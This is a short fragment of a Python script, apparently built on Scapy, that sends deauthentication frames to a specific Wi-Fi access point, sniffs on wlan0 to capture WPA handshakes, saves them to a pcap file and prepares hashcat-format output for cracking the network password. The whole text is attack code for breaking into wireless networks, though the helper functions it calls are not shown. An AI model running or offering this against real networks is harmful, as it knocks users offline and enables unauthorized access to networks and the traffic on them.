...
#Define the paths
pcap_file = 'amr.pcap'
output_file = 'zed.hc22000'
destination_path = 'Desktop/grad/zed.hccapx'
...
deauthenticate_network(bssid = "C0:FD:84:D3:0C:17 ")
# List to store network data and captured handshakes
networks = []
handshakes = []

# Sniff Wi-Fi packets
sniff(iface="wlan0", prn=packet_handler, timeout=60)

# Write captured handshakes to a pcap file
wrpcap("amr.pcap", handshakes)
